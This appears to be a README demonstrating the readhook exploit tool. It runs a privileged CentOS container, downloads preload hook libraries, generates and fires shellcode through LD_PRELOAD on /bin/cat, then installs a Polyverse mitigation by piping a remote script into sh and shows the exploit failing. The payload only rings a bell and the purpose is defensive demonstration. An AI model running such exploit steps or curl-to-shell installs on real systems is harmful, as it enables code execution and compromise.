# Readhook3d Demonstration
## Allocate a Centos Environment (with curl and wget)
```
docker run --rm -it --privileged --name centos centos
yum update -y && yum install -y curl wget
```
## Download Readhook3d Components
```
wget -q -O /tmp/basehook.so https://github.com/polyverse/readhook/releases/download/jenkins3d/basehook.so
wget -q -O /tmp/fullhook.so https://github.com/polyverse/readhook/releases/download/jenkins3d/fullhook.so
```
## Generate Shell-code and Perform Exploit
```
export shellCode=$(echo -n xyzzxMAKELOAD | LD_PRELOAD=/tmp/fullhook.so /bin/cat)
echo -n $shellCode | LD_PRELOAD=/tmp/basehook.so /bin/cat
# (Confirm an audible bell)
```
## Install Polyverse and Repeat Exploit
```
curl https://sh.polyverse.io | sh -s install vZ2v3Bo4Kbnwj9pECrLsoGDDo
yum reinstall -y \*
echo -n $shellCode | LD_PRELOAD=/tmp/basehook.so /bin/cat
# (Confirm that there is no audible bell)
```
